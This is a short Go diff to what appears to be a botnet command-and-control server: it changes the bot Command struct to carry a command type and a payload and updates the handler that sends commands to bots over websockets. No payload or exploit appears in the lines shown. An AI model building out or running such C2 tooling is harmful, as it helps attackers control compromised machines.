@@ -35,8 +35,9 @@ func (b *Bot) updateLastseen() {
 }
 
 type Command struct {
-	BotID int    `json:"id"`
-	Cmd   string `json:"cmd"`
+	BotID   int    `json:"id"`
+	CmdType string `json:"cmdtype"`
+	Payload string `json:"payload"`
 }
 
 type BotMessage struct {
@@ -155,7 +156,7 @@ func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
 	// fmt.Println(cmd)
 	bot := c.getBot(cmd.BotID)
 
-	if err = wsjson.Write(context.Background(), bot.con, cmd.Cmd); err != nil {
+	if err = wsjson.Write(context.Background(), bot.con, cmd.CmdType); err != nil {
 		log.Println(err)
 		return
 	}
